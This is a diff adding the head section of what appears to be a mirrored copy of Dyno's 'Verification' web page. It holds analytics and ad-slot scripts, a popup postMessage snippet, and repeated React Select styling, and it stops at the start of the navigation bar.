@@ -1,0 +1,1532 @@
+<html class="no-js" lang="en" dir="ltr">
+
+<head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+
+  <script src="../cdn.iubenda.com/iubenda.js"></script>
+  <script src="../cdn.iubenda.com/iubenda.js"></script>
+  <script src="../cdn.iubenda.com/iubenda.js"></script>
+  <script src="../cdn.iubenda.com/iubenda.js"></script>
+  <script async="" src="../www.googletagmanager.com/gtm5445.html?id=GTM-TCG3DTF2"></script>
+  <script>
+    if (window.opener) {
+      const params = window.location.search || {};
+      params.manageGuild = true;
+      window.opener.postMessage(params);
+      window.close();
+    }
+  </script>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verification - Dyno</title>
+  <link rel="shortcut icon" type="image/png" href="https://dyno.gg/images/v3/favicon.png">
+  <link rel="stylesheet" href="../pro.fontawesome.com/releases/v5.1.0/css/all.css"
+    integrity="sha384-87DrmpqHRiY8hPLIr7ByqhPIywuSsjuQAfMXAE0sMUpY3BM7nXjf+mLIUSvhDArs" crossorigin="anonymous">
+  <link rel="preconnect" href="https://fonts.googleapis.com/">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&amp;display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/css/app.e18996536f.css">
+  <link rel="stylesheet" href="/css/serverlist.e18996536f.css">
+  <script>
+    window.dataLayer = window.dataLayer || [];
+  </script>
+  <script>
+    (function (w, d, s, l, i) {
+      w[l] = w[l] || [];
+      w[l].push({
+        'gtm.start': new Date().getTime(),
+        event: 'gtm.js'
+      });
+      var f = d.getElementsByTagName(s)[0],
+        j = d.createElement(s),
+        dl = l != 'dataLayer' ? '&l=' + l : '';
+      j.async = true;
+      j.src =
+        '../www.googletagmanager.com/gtm5445.html?id=' + i + dl;
+      f.parentNode.insertBefore(j, f);
+    })(window, document, 'script', 'dataLayer', 'GTM-TCG3DTF2');
+  </script>
+  <script async="async" src="../www.googletagservices.com/tag/js/f.txt"></script>
+  <script>
+    var googletag = googletag || {};
+    googletag.cmd = googletag.cmd || [];
+  </script>
+  <script>
+    googletag.cmd.push(function () {
+      var mapping728x90ATF1 = googletag.sizeMapping().addSize([728, 0], [
+        [728, 90],
+        [970, 250],
+        [970, 90],
+        [728, 280]
+      ]).addSize([450, 0], [
+        [728, 90],
+        [320, 100],
+        [320, 50]
+      ]).addSize([1, 0], [
+        [320, 50],
+        [320, 100]
+      ]).build();
+      var mapping300x250ATF1 = googletag.sizeMapping().addSize([320, 0], [
+        [300, 250],
+        [336, 280]
+      ]).addSize([1, 0], [
+        [300, 250]
+      ]).build();
+      var gptAdSlots = [];
+      gptAdSlots[0] = googletag.defineSlot('/22280732/DynoGG_728x90_Other_ATF1', [
+        [320, 50],
+        [320, 100],
+        [728, 90],
+        [970, 90],
+        [970, 250]
+      ], 'div-gpt-ad-1559171339966-0').defineSizeMapping(mapping728x90ATF1).addService(googletag.pubads());
+      gptAdSlots[1] = googletag.defineSlot('/22280732/DynoGG_300x250_Other_ATF1', [300, 250],
+        'div-gpt-ad-1559171433538-0').defineSizeMapping(mapping300x250ATF1).addService(googletag.pubads());
+      googletag.pubads().enableSingleRequest();
+      googletag.pubads().collapseEmptyDivs();
+      googletag.pubads().enableLazyLoad({
+        fetchMarginPercent: -1
+      });
+      googletag.enableServices();
+    });
+  </script>
+  <script src="https://btloader.com/tag?o=5662751368151040&amp;upapi=true" async="async"></script>
+  <style type="text/css">
+    /**
+* React Select
+* ============
+* Created by Jed Watson and Joss Mackison for KeystoneJS, http://www.keystonejs.com/
+* https://twitter.com/jedwatson https://twitter.com/jossmackison https://twitter.com/keystonejs
+* MIT License: https://github.com/JedWatson/react-select
+*/
+    .Select {
+      position: relative;
+    }
+
+    .Select input::-webkit-contacts-auto-fill-button,
+    .Select input::-webkit-credentials-auto-fill-button {
+      display: none !important;
+    }
+
+    .Select input::-ms-clear {
+      display: none !important;
+    }
+
+    .Select input::-ms-reveal {
+      display: none !important;
+    }
+
+    .Select,
+    .Select div,
+    .Select input,
+    .Select span {
+      -webkit-box-sizing: border-box;
+      -moz-box-sizing: border-box;
+      box-sizing: border-box;
+    }
+
+    .Select.is-disabled .Select-arrow-zone {
+      cursor: default;
+      pointer-events: none;
+      opacity: 0.35;
+    }
+
+    .Select.is-disabled>.Select-control {
+      background-color: #f9f9f9;
+    }
+
+    .Select.is-disabled>.Select-control:hover {
+      box-shadow: none;
+    }
+
+    .Select.is-open>.Select-control {
+      border-bottom-right-radius: 0;
+      border-bottom-left-radius: 0;
+      background: #fff;
+      border-color: #b3b3b3 #ccc #d9d9d9;
+    }
+
+    .Select.is-open>.Select-control .Select-arrow {
+      top: -2px;
+      border-color: transparent transparent #999;
+      border-width: 0 5px 5px;
+    }
+
+    .Select.is-searchable.is-open>.Select-control {
+      cursor: text;
+    }
+
+    .Select.is-searchable.is-focused:not(.is-open)>.Select-control {
+      cursor: text;
+    }
+
+    .Select.is-focused>.Select-control {
+      background: #fff;
+    }
+
+    .Select.is-focused:not(.is-open)>.Select-control {
+      border-color: #007eff;
+      box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 0 3px rgba(0, 126, 255, 0.1);
+      background: #fff;
+    }
+
+    .Select.has-value.is-clearable.Select--single>.Select-control .Select-value {
+      padding-right: 42px;
+    }
+
+    .Select.has-value.Select--single>.Select-control .Select-value .Select-value-label,
+    .Select.has-value.is-pseudo-focused.Select--single>.Select-control .Select-value .Select-value-label {
+      color: #333;
+    }
+
+    .Select.has-value.Select--single>.Select-control .Select-value a.Select-value-label,
+    .Select.has-value.is-pseudo-focused.Select--single>.Select-control .Select-value a.Select-value-label {
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    .Select.has-value.Select--single>.Select-control .Select-value a.Select-value-label:hover,
+    .Select.has-value.is-pseudo-focused.Select--single>.Select-control .Select-value a.Select-value-label:hover,
+    .Select.has-value.Select--single>.Select-control .Select-value a.Select-value-label:focus,
+    .Select.has-value.is-pseudo-focused.Select--single>.Select-control .Select-value a.Select-value-label:focus {
+      color: #007eff;
+      outline: none;
+      text-decoration: underline;
+    }
+
+    .Select.has-value.Select--single>.Select-control .Select-value a.Select-value-label:focus,
+    .Select.has-value.is-pseudo-focused.Select--single>.Select-control .Select-value a.Select-value-label:focus {
+      background: #fff;
+    }
+
+    .Select.has-value.is-pseudo-focused .Select-input {
+      opacity: 0;
+    }
+
+    .Select.is-open .Select-arrow,
+    .Select .Select-arrow-zone:hover>.Select-arrow {
+      border-top-color: #666;
+    }
+
+    .Select.Select--rtl {
+      direction: rtl;
+      text-align: right;
+    }
+
+    .Select-control {
+      background-color: #fff;
+      border-color: #d9d9d9 #ccc #b3b3b3;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+      color: #333;
+      cursor: default;
+      display: table;
+      border-spacing: 0;
+      border-collapse: separate;
+      height: 36px;
+      outline: none;
+      overflow: hidden;
+      position: relative;
+      width: 100%;
+    }
+
+    .Select-control:hover {
+      box-shadow: 0 1px 0 rgba(0, 0, 0, 0.06);
+    }
+
+    .Select-control .Select-input:focus {
+      outline: none;
+      background: #fff;
+    }
+
+    .Select-placeholder,
+    .Select--single>.Select-control .Select-value {
+      bottom: 0;
+      color: #aaa;
+      left: 0;
+      line-height: 34px;
+      padding-left: 10px;
+      padding-right: 10px;
+      position: absolute;
+      right: 0;
+      top: 0;
+      max-width: 100%;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .Select-input {
+      height: 34px;
+      padding-left: 10px;
+      padding-right: 10px;
+      vertical-align: middle;
+    }
+
+    .Select-input>input {
+      width: 100%;
+      background: none transparent;
+      border: 0 none;
+      box-shadow: none;
+      cursor: default;
+      display: inline-block;
+      font-family: inherit;
+      font-size: inherit;
+      margin: 0;
+      outline: none;
+      line-height: 17px;
+      /* For IE 8 compatibility */
+      padding: 8px 0 12px;
+      /* For IE 8 compatibility */
+      -webkit-appearance: none;
+    }
+
+    .is-focused .Select-input>input {
+      cursor: text;
+    }
+
+    .has-value.is-pseudo-focused .Select-input {
+      opacity: 0;
+    }
+
+    .Select-control:not(.is-searchable)>.Select-input {
+      outline: none;
+    }
+
+    .Select-loading-zone {
+      cursor: pointer;
+      display: table-cell;
+      position: relative;
+      text-align: center;
+      vertical-align: middle;
+      width: 16px;
+    }
+
+    .Select-loading {
+      -webkit-animation: Select-animation-spin 400ms infinite linear;
+      -o-animation: Select-animation-spin 400ms infinite linear;
+      animation: Select-animation-spin 400ms infinite linear;
+      width: 16px;
+      height: 16px;
+      box-sizing: border-box;
+      border-radius: 50%;
+      border: 2px solid #ccc;
+      border-right-color: #333;
+      display: inline-block;
+      position: relative;
+      vertical-align: middle;
+    }
+
+    .Select-clear-zone {
+      -webkit-animation: Select-animation-fadeIn 200ms;
+      -o-animation: Select-animation-fadeIn 200ms;
+      animation: Select-animation-fadeIn 200ms;
+      color: #999;
+      cursor: pointer;
+      display: table-cell;
+      position: relative;
+      text-align: center;
+      vertical-align: middle;
+      width: 17px;
+    }
+
+    .Select-clear-zone:hover {
+      color: #D0021B;
+    }
+
+    .Select-clear {
+      display: inline-block;
+      font-size: 18px;
+      line-height: 1;
+    }
+
+    .Select--multi .Select-clear-zone {
+      width: 17px;
+    }
+
+    .Select-arrow-zone {
+      cursor: pointer;
+      display: table-cell;
+      position: relative;
+      text-align: center;
+      vertical-align: middle;
+      width: 25px;
+      padding-right: 5px;
+    }
+
+    .Select--rtl .Select-arrow-zone {
+      padding-right: 0;
+      padding-left: 5px;
+    }
+
+    .Select-arrow {
+      border-color: #999 transparent transparent;
+      border-style: solid;
+      border-width: 5px 5px 2.5px;
+      display: inline-block;
+      height: 0;
+      width: 0;
+      position: relative;
+    }
+
+    .Select-control>*:last-child {
+      padding-right: 5px;
+    }
+
+    .Select--multi .Select-multi-value-wrapper {
+      display: inline-block;
+    }
+
+    .Select .Select-aria-only {
+      position: absolute;
+      display: inline-block;
+      height: 1px;
+      width: 1px;
+      margin: -1px;
+      clip: rect(0, 0, 0, 0);
+      overflow: hidden;
+      float: left;
+    }
+
+    @-webkit-keyframes Select-animation-fadeIn {
+      from {
+        opacity: 0;
+      }
+
+      to {
+        opacity: 1;
+      }
+    }
+
+    @keyframes Select-animation-fadeIn {
+      from {
+        opacity: 0;
+      }
+
+      to {
+        opacity: 1;
+      }
+    }
+
+    .Select-menu-outer {
+      border-bottom-right-radius: 4px;
+      border-bottom-left-radius: 4px;
+      background-color: #fff;
+      border: 1px solid #ccc;
+      border-top-color: #e6e6e6;
+      box-shadow: 0 1px 0 rgba(0, 0, 0, 0.06);
+      box-sizing: border-box;
+      margin-top: -1px;
+      max-height: 200px;
+      position: absolute;
+      left: 0;
+      top: 100%;
+      width: 100%;
+      z-index: 1;
+      -webkit-overflow-scrolling: touch;
+    }
+
+    .Select-menu {
+      max-height: 198px;
+      overflow-y: auto;
+    }
+
+    .Select-option {
+      box-sizing: border-box;
+      background-color: #fff;
+      color: #666666;
+      cursor: pointer;
+      display: block;
+      padding: 8px 10px;
+    }
+
+    .Select-option:last-child {
+      border-bottom-right-radius: 4px;
+      border-bottom-left-radius: 4px;
+    }
+
+    .Select-option.is-selected {
+      background-color: #f5faff;
+      /* Fallback color for IE 8 */
+      background-color: rgba(0, 126, 255, 0.04);
+      color: #333;
+    }
+
+    .Select-option.is-focused {
+      background-color: #ebf5ff;
+      /* Fallback color for IE 8 */
+      background-color: rgba(0, 126, 255, 0.08);
+      color: #333;
+    }
+
+    .Select-option.is-disabled {
+      color: #cccccc;
+      cursor: default;
+    }
+
+    .Select-noresults {
+      box-sizing: border-box;
+      color: #999999;
+      cursor: default;
+      display: block;
+      padding: 8px 10px;
+    }
+
+    .Select--multi .Select-input {
+      vertical-align: middle;
+      margin-left: 10px;
+      padding: 0;
+    }
+
+    .Select--multi.Select--rtl .Select-input {
+      margin-left: 0;
+      margin-right: 10px;
+    }
+
+    .Select--multi.has-value .Select-input {
+      margin-left: 5px;
+    }
+
+    .Select--multi .Select-value {
+      background-color: #ebf5ff;
+      /* Fallback color for IE 8 */
+      background-color: rgba(0, 126, 255, 0.08);
+      border-radius: 2px;
+      border: 1px solid #c2e0ff;
+      /* Fallback color for IE 8 */
+      border: 1px solid rgba(0, 126, 255, 0.24);
+      color: #007eff;
+      display: inline-block;
+      font-size: 0.9em;
+      line-height: 1.4;
+      margin-left: 5px;
+      margin-top: 5px;
+      vertical-align: top;
+    }
+
+    .Select--multi .Select-value-icon,
+    .Select--multi .Select-value-label {
+      display: inline-block;
+      vertical-align: middle;
+    }
+
+    .Select--multi .Select-value-label {
+      border-bottom-right-radius: 2px;
+      border-top-right-radius: 2px;
+      cursor: default;
+      padding: 2px 5px;
+    }
+
+    .Select--multi a.Select-value-label {
+      color: #007eff;
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    .Select--multi a.Select-value-label:hover {
+      text-decoration: underline;
+    }
+
+    .Select--multi .Select-value-icon {
+      cursor: pointer;
+      border-bottom-left-radius: 2px;
+      border-top-left-radius: 2px;
+      border-right: 1px solid #c2e0ff;
+      /* Fallback color for IE 8 */
+      border-right: 1px solid rgba(0, 126, 255, 0.24);
+      padding: 1px 5px 3px;
+    }
+
+    .Select--multi .Select-value-icon:hover,
+    .Select--multi .Select-value-icon:focus {
+      background-color: #d8eafd;
+      /* Fallback color for IE 8 */
+      background-color: rgba(0, 113, 230, 0.08);
+      color: #0071e6;
+    }
+
+    .Select--multi .Select-value-icon:active {
+      background-color: #c2e0ff;
+      /* Fallback color for IE 8 */
+      background-color: rgba(0, 126, 255, 0.24);
+    }
+
+    .Select--multi.Select--rtl .Select-value {
+      margin-left: 0;
+      margin-right: 5px;
+    }
+
+    .Select--multi.Select--rtl .Select-value-icon {
+      border-right: none;
+      border-left: 1px solid #c2e0ff;
+      /* Fallback color for IE 8 */
+      border-left: 1px solid rgba(0, 126, 255, 0.24);
+    }
+
+    .Select--multi.is-disabled .Select-value {
+      background-color: #fcfcfc;
+      border: 1px solid #e3e3e3;
+      color: #333;
+    }
+
+    .Select--multi.is-disabled .Select-value-icon {
+      cursor: not-allowed;
+      border-right: 1px solid #e3e3e3;
+    }
+
+    .Select--multi.is-disabled .Select-value-icon:hover,
+    .Select--multi.is-disabled .Select-value-icon:focus,
+    .Select--multi.is-disabled .Select-value-icon:active {
+      background-color: #fcfcfc;
+    }
+
+    @keyframes Select-animation-spin {
+      to {
+        transform: rotate(1turn);
+      }
+    }
+
+    @-webkit-keyframes Select-animation-spin {
+      to {
+        -webkit-transform: rotate(1turn);
+      }
+    }
+  </style>
+  <style type="text/css">
+    .sort-wrapper .Select-control,
+    .sort-wrapper .Select.is-open>.Select-control,
+    .sort-wrapper .Select.is-focused>.Select-control,
+    .sort-wrapper .Select.is-focused:not(.is-open)>.Select-control,
+    .sort-wrapper .Select-menu-outer,
+    .sort-wrapper .Select-option {
+      background: rgb(24, 26, 32);
+      ;
+    }
+
+    .automod-toggles .automod-selector.control.rich-select {
+      padding: 0.5em 1em;
+    }
+
+
+    .sort-wrapper .Select-control,
+    .sort-wrapper .Select--multi .Select-value,
+    .sort-wrapper .Select--multi .Select-value-icon,
+    .sort-wrapper .Select.is-open>.Select-control,
+    .sort-wrapper .Select.is-focused>.Select-control,
+    .sort-wrapper .Select.is-focused:not(.is-open)>.Select-control {
+      border: none;
+      /* border-color: rgba(12,233,211, 0.4); */
+    }
+
+    .Select.is-open>.Select-control,
+    .Select-menu-outer {
+      border: none !important;
+    }
+
+    .Select-menu-outer,
+    .Select-option,
+    .Select-menu {
+      border-top-color: #606a7b !important;
+      color: #6B7E91 !important;
+      font-weight: 400;
+    }
+
+    .Select-option {
+      background: transparent !important;
+    }
+
+    .Select-value-label,
+    .Select-placeholder {
+      color: #6B7E91 !important;
+    }
+
+    .rich-select {
+      background-color: transparent;
+      border-radius: 4px;
+      outline-color: rgba(243, 83, 83, 0.25);
+    }
+
+    .rich-select:focus {
+      box-shadow: 0 0 0 0.125em rgba(243, 83, 83, 0.25);
+    }
+
+    .rich-select .rich-select-top {
+      display: flex;
+      justify-content: space-between;
+      background-color: transparent;
+      border-radius: 5px;
+    }
+
+    .rich-select label {
+      color: #6B7E91;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      font-size: 12px;
+      line-height: 20px;
+    }
+
+
+    @media (max-width: 1200px) {
+      .sort-wrapper {
+        width: 47%;
+      }
+    }
+
+    /* @media (max-width: 769px) {
+.sort-wrapper {
+  width: 99%;
+}
+} */
+  </style>
+  <script async="" src="//www.googletagservices.com/tag/js/gpt.js"></script>
+  <style type="text/css">
+    .guild-selector .Select-control,
+    .guild-selector .Select-control .Select-input:focus,
+    .guild-selector .Select.is-open>.Select-control,
+    .guild-selector .Select.is-focused>.Select-control,
+    .guild-selector .Select.is-focused:not(.is-open)>.Select-control,
+    .guild-selector .Select-menu-outer,
+    .guild-selector .Select-option {
+      background: #3B3D43;
+      background-color: #3B3D43;
+      color: #fff;
+    }
+
+
+    .guild-selector .Select-control,
+    .guild-selector .Select--multi .Select-value,
+    .guild-selector .Select--multi .Select-value-icon,
+    .guild-selector .Select.is-open>.Select-control,
+    .guild-selector .Select.is-focused>.Select-control,
+    .guild-selector .Select.is-focused:not(.is-open)>.Select-control {
+      border-color: #555;
+    }
+
+    .guild-selector .Select-menu-outer {
+      border-color: #555;
+    }
+
+    @media (max-width: 1200px) {
+      .guild-selector {
+        width: 200px;
+        max-width: 200px;
+      }
+    }
+
+    @media (max-width: 769px) {
+      .guild-selector {
+        width: 200px;
+        max-width: 200px;
+      }
+    }
+
+    /* #select-server {
+width: 200px;
+} */
+
+    /* .select select
+background-color: $accent-background;
+color: $text;
+border: solid #555 1px;
+
+.server-select
+max-width: 200px;
+select
+  max-width: 200px; */
+  </style>
+  <style type="text/css">
+    /**
+* React Select
+* ============
+* Created by Jed Watson and Joss Mackison for KeystoneJS, http://www.keystonejs.com/
+* https://twitter.com/jedwatson https://twitter.com/jossmackison https://twitter.com/keystonejs
+* MIT License: https://github.com/JedWatson/react-select
+*/
+    .Select {
+      position: relative;
+    }
+
+    .Select input::-webkit-contacts-auto-fill-button,
+    .Select input::-webkit-credentials-auto-fill-button {
+      display: none !important;
+    }
+
+    .Select input::-ms-clear {
+      display: none !important;
+    }
+
+    .Select input::-ms-reveal {
+      display: none !important;
+    }
+
+    .Select,
+    .Select div,
+    .Select input,
+    .Select span {
+      -webkit-box-sizing: border-box;
+      -moz-box-sizing: border-box;
+      box-sizing: border-box;
+    }
+
+    .Select.is-disabled .Select-arrow-zone {
+      cursor: default;
+      pointer-events: none;
+      opacity: 0.35;
+    }
+
+    .Select.is-disabled>.Select-control {
+      background-color: #f9f9f9;
+    }
+
+    .Select.is-disabled>.Select-control:hover {
+      box-shadow: none;
+    }
+
+    .Select.is-open>.Select-control {
+      border-bottom-right-radius: 0;
+      border-bottom-left-radius: 0;
+      background: #fff;
+      border-color: #b3b3b3 #ccc #d9d9d9;
+    }
+
+    .Select.is-open>.Select-control .Select-arrow {
+      top: -2px;
+      border-color: transparent transparent #999;
+      border-width: 0 5px 5px;
+    }
+
+    .Select.is-searchable.is-open>.Select-control {
+      cursor: text;
+    }
+
+    .Select.is-searchable.is-focused:not(.is-open)>.Select-control {
+      cursor: text;
+    }
+
+    .Select.is-focused>.Select-control {
+      background: #fff;
+    }
+
+    .Select.is-focused:not(.is-open)>.Select-control {
+      border-color: #007eff;
+      box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 0 3px rgba(0, 126, 255, 0.1);
+      background: #fff;
+    }
+
+    .Select.has-value.is-clearable.Select--single>.Select-control .Select-value {
+      padding-right: 42px;
+    }
+
+    .Select.has-value.Select--single>.Select-control .Select-value .Select-value-label,
+    .Select.has-value.is-pseudo-focused.Select--single>.Select-control .Select-value .Select-value-label {
+      color: #333;
+    }
+
+    .Select.has-value.Select--single>.Select-control .Select-value a.Select-value-label,
+    .Select.has-value.is-pseudo-focused.Select--single>.Select-control .Select-value a.Select-value-label {
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    .Select.has-value.Select--single>.Select-control .Select-value a.Select-value-label:hover,
+    .Select.has-value.is-pseudo-focused.Select--single>.Select-control .Select-value a.Select-value-label:hover,
+    .Select.has-value.Select--single>.Select-control .Select-value a.Select-value-label:focus,
+    .Select.has-value.is-pseudo-focused.Select--single>.Select-control .Select-value a.Select-value-label:focus {
+      color: #007eff;
+      outline: none;
+      text-decoration: underline;
+    }
+
+    .Select.has-value.Select--single>.Select-control .Select-value a.Select-value-label:focus,
+    .Select.has-value.is-pseudo-focused.Select--single>.Select-control .Select-value a.Select-value-label:focus {
+      background: #fff;
+    }
+
+    .Select.has-value.is-pseudo-focused .Select-input {
+      opacity: 0;
+    }
+
+    .Select.is-open .Select-arrow,
+    .Select .Select-arrow-zone:hover>.Select-arrow {
+      border-top-color: #666;
+    }
+
+    .Select.Select--rtl {
+      direction: rtl;
+      text-align: right;
+    }
+
+    .Select-control {
+      background-color: #fff;
+      border-color: #d9d9d9 #ccc #b3b3b3;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+      color: #333;
+      cursor: default;
+      display: table;
+      border-spacing: 0;
+      border-collapse: separate;
+      height: 36px;
+      outline: none;
+      overflow: hidden;
+      position: relative;
+      width: 100%;
+    }
+
+    .Select-control:hover {
+      box-shadow: 0 1px 0 rgba(0, 0, 0, 0.06);
+    }
+
+    .Select-control .Select-input:focus {
+      outline: none;
+      background: #fff;
+    }
+
+    .Select-placeholder,
+    .Select--single>.Select-control .Select-value {
+      bottom: 0;
+      color: #aaa;
+      left: 0;
+      line-height: 34px;
+      padding-left: 10px;
+      padding-right: 10px;
+      position: absolute;
+      right: 0;
+      top: 0;
+      max-width: 100%;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .Select-input {
+      height: 34px;
+      padding-left: 10px;
+      padding-right: 10px;
+      vertical-align: middle;
+    }
+
+    .Select-input>input {
+      width: 100%;
+      background: none transparent;
+      border: 0 none;
+      box-shadow: none;
+      cursor: default;
+      display: inline-block;
+      font-family: inherit;
+      font-size: inherit;
+      margin: 0;
+      outline: none;
+      line-height: 17px;
+      /* For IE 8 compatibility */
+      padding: 8px 0 12px;
+      /* For IE 8 compatibility */
+      -webkit-appearance: none;
+    }
+
+    .is-focused .Select-input>input {
+      cursor: text;
+    }
+
+    .has-value.is-pseudo-focused .Select-input {
+      opacity: 0;
+    }
+
+    .Select-control:not(.is-searchable)>.Select-input {
+      outline: none;
+    }
+
+    .Select-loading-zone {
+      cursor: pointer;
+      display: table-cell;
+      position: relative;
+      text-align: center;
+      vertical-align: middle;
+      width: 16px;
+    }
+
+    .Select-loading {
+      -webkit-animation: Select-animation-spin 400ms infinite linear;
+      -o-animation: Select-animation-spin 400ms infinite linear;
+      animation: Select-animation-spin 400ms infinite linear;
+      width: 16px;
+      height: 16px;
+      box-sizing: border-box;
+      border-radius: 50%;
+      border: 2px solid #ccc;
+      border-right-color: #333;
+      display: inline-block;
+      position: relative;
+      vertical-align: middle;
+    }
+
+    .Select-clear-zone {
+      -webkit-animation: Select-animation-fadeIn 200ms;
+      -o-animation: Select-animation-fadeIn 200ms;
+      animation: Select-animation-fadeIn 200ms;
+      color: #999;
+      cursor: pointer;
+      display: table-cell;
+      position: relative;
+      text-align: center;
+      vertical-align: middle;
+      width: 17px;
+    }
+
+    .Select-clear-zone:hover {
+      color: #D0021B;
+    }
+
+    .Select-clear {
+      display: inline-block;
+      font-size: 18px;
+      line-height: 1;
+    }
+
+    .Select--multi .Select-clear-zone {
+      width: 17px;
+    }
+
+    .Select-arrow-zone {
+      cursor: pointer;
+      display: table-cell;
+      position: relative;
+      text-align: center;
+      vertical-align: middle;
+      width: 25px;
+      padding-right: 5px;
+    }
+
+    .Select--rtl .Select-arrow-zone {
+      padding-right: 0;
+      padding-left: 5px;
+    }
+
+    .Select-arrow {
+      border-color: #999 transparent transparent;
+      border-style: solid;
+      border-width: 5px 5px 2.5px;
+      display: inline-block;
+      height: 0;
+      width: 0;
+      position: relative;
+    }
+
+    .Select-control>*:last-child {
+      padding-right: 5px;
+    }
+
+    .Select--multi .Select-multi-value-wrapper {
+      display: inline-block;
+    }
+
+    .Select .Select-aria-only {
+      position: absolute;
+      display: inline-block;
+      height: 1px;
+      width: 1px;
+      margin: -1px;
+      clip: rect(0, 0, 0, 0);
+      overflow: hidden;
+      float: left;
+    }
+
+    @-webkit-keyframes Select-animation-fadeIn {
+      from {
+        opacity: 0;
+      }
+
+      to {
+        opacity: 1;
+      }
+    }
+
+    @keyframes Select-animation-fadeIn {
+      from {
+        opacity: 0;
+      }
+
+      to {
+        opacity: 1;
+      }
+    }
+
+    .Select-menu-outer {
+      border-bottom-right-radius: 4px;
+      border-bottom-left-radius: 4px;
+      background-color: #fff;
+      border: 1px solid #ccc;
+      border-top-color: #e6e6e6;
+      box-shadow: 0 1px 0 rgba(0, 0, 0, 0.06);
+      box-sizing: border-box;
+      margin-top: -1px;
+      max-height: 200px;
+      position: absolute;
+      left: 0;
+      top: 100%;
+      width: 100%;
+      z-index: 1;
+      -webkit-overflow-scrolling: touch;
+    }
+
+    .Select-menu {
+      max-height: 198px;
+      overflow-y: auto;
+    }
+
+    .Select-option {
+      box-sizing: border-box;
+      background-color: #fff;
+      color: #666666;
+      cursor: pointer;
+      display: block;
+      padding: 8px 10px;
+    }
+
+    .Select-option:last-child {
+      border-bottom-right-radius: 4px;
+      border-bottom-left-radius: 4px;
+    }
+
+    .Select-option.is-selected {
+      background-color: #f5faff;
+      /* Fallback color for IE 8 */
+      background-color: rgba(0, 126, 255, 0.04);
+      color: #333;
+    }
+
+    .Select-option.is-focused {
+      background-color: #ebf5ff;
+      /* Fallback color for IE 8 */
+      background-color: rgba(0, 126, 255, 0.08);
+      color: #333;
+    }
+
+    .Select-option.is-disabled {
+      color: #cccccc;
+      cursor: default;
+    }
+
+    .Select-noresults {
+      box-sizing: border-box;
+      color: #999999;
+      cursor: default;
+      display: block;
+      padding: 8px 10px;
+    }
+
+    .Select--multi .Select-input {
+      vertical-align: middle;
+      margin-left: 10px;
+      padding: 0;
+    }
+
+    .Select--multi.Select--rtl .Select-input {
+      margin-left: 0;
+      margin-right: 10px;
+    }
+
+    .Select--multi.has-value .Select-input {
+      margin-left: 5px;
+    }
+
+    .Select--multi .Select-value {
+      background-color: #ebf5ff;
+      /* Fallback color for IE 8 */
+      background-color: rgba(0, 126, 255, 0.08);
+      border-radius: 2px;
+      border: 1px solid #c2e0ff;
+      /* Fallback color for IE 8 */
+      border: 1px solid rgba(0, 126, 255, 0.24);
+      color: #007eff;
+      display: inline-block;
+      font-size: 0.9em;
+      line-height: 1.4;
+      margin-left: 5px;
+      margin-top: 5px;
+      vertical-align: top;
+    }
+
+    .Select--multi .Select-value-icon,
+    .Select--multi .Select-value-label {
+      display: inline-block;
+      vertical-align: middle;
+    }
+
+    .Select--multi .Select-value-label {
+      border-bottom-right-radius: 2px;
+      border-top-right-radius: 2px;
+      cursor: default;
+      padding: 2px 5px;
+    }
+
+    .Select--multi a.Select-value-label {
+      color: #007eff;
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    .Select--multi a.Select-value-label:hover {
+      text-decoration: underline;
+    }
+
+    .Select--multi .Select-value-icon {
+      cursor: pointer;
+      border-bottom-left-radius: 2px;
+      border-top-left-radius: 2px;
+      border-right: 1px solid #c2e0ff;
+      /* Fallback color for IE 8 */
+      border-right: 1px solid rgba(0, 126, 255, 0.24);
+      padding: 1px 5px 3px;
+    }
+
+    .Select--multi .Select-value-icon:hover,
+    .Select--multi .Select-value-icon:focus {
+      background-color: #d8eafd;
+      /* Fallback color for IE 8 */
+      background-color: rgba(0, 113, 230, 0.08);
+      color: #0071e6;
+    }
+
+    .Select--multi .Select-value-icon:active {
+      background-color: #c2e0ff;
+      /* Fallback color for IE 8 */
+      background-color: rgba(0, 126, 255, 0.24);
+    }
+
+    .Select--multi.Select--rtl .Select-value {
+      margin-left: 0;
+      margin-right: 5px;
+    }
+
+    .Select--multi.Select--rtl .Select-value-icon {
+      border-right: none;
+      border-left: 1px solid #c2e0ff;
+      /* Fallback color for IE 8 */
+      border-left: 1px solid rgba(0, 126, 255, 0.24);
+    }
+
+    .Select--multi.is-disabled .Select-value {
+      background-color: #fcfcfc;
+      border: 1px solid #e3e3e3;
+      color: #333;
+    }
+
+    .Select--multi.is-disabled .Select-value-icon {
+      cursor: not-allowed;
+      border-right: 1px solid #e3e3e3;
+    }
+
+    .Select--multi.is-disabled .Select-value-icon:hover,
+    .Select--multi.is-disabled .Select-value-icon:focus,
+    .Select--multi.is-disabled .Select-value-icon:active {
+      background-color: #fcfcfc;
+    }
+
+    @keyframes Select-animation-spin {
+      to {
+        transform: rotate(1turn);
+      }
+    }
+
+    @-webkit-keyframes Select-animation-spin {
+      to {
+        -webkit-transform: rotate(1turn);
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TCG3DTF2" height="0" width="0"
+      style="display:none;visibility:hidden"></iframe></noscript>
+  <nav id="navbar-mount">
+    <nav class="navbar" role="navigation" aria-label="main navigation">
+      <div class="navbar-container is-flex">
+        <div class="navbar-brand columns is-vcentered">
+          <div class="column navbar-burger-column"><a role="button" class="navbar-burger burger" aria-label="menu"
+              aria-expanded="false"><span aria-hidden="true"></span><span aria-hidden="true"></span><span
+                aria-hidden="true"></span></a></div>
